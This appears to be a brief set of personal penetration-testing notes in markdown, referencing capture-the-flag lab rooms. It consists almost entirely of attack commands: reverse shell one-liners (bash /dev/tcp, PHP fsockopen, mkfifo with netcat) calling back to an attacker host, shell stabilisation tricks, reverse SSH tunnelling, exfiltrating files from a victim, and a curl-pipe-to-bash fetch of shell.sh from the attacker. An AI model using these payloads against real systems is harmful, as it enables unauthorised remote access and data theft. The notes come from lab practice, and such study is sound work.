
#### Reverse shell options
This is a very good [reference](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for reverse shell payloads

| Condition | Command |
|---|---|
| bash / sh | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` |
| PHP | `php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'` |
| mkfifo (universal) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc ip port >/tmp/f` |
| nc listener | `nc -lvnp 4444` |

#### Stabilise / upgrade shell

| Condition | Command |
|---|---|
| python pty | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
| script method | `/usr/bin/script -qc /bin/bash /dev/null` then Ctrl+Z → `stty raw -echo` → `fg` → `export TERM=xterm` |
| Port tunnelling | `ssh -N -R ATTACKIP:9001:127.0.0.1:9001 user@ATTACKIP` ·|

#### Transfer files between machines

**Victim → Attacker** (serve from victim, download on attacker)

1. On victim: `python3 -m http.server 8000`
2. On attacker: `wget http://<victim_ip>:8000/filename`

*Wonderland (teaParty binary for RE), Glitch (.firefox profile)*

**Attacker → Victim** (serve from attacker, curl/wget on victim)

1. On attacker: `python3 -m http.server 8000`
2. On victim: `curl http://<attacker_ip>:8000/shell.sh | bash`

*Chillhack, ContainMe*

**SCP (if SSH known)**

`scp user@$IP:/remote/path ./local/` · *Basic Pentesting (kay's id_rsa), Agent Sudo (image)*
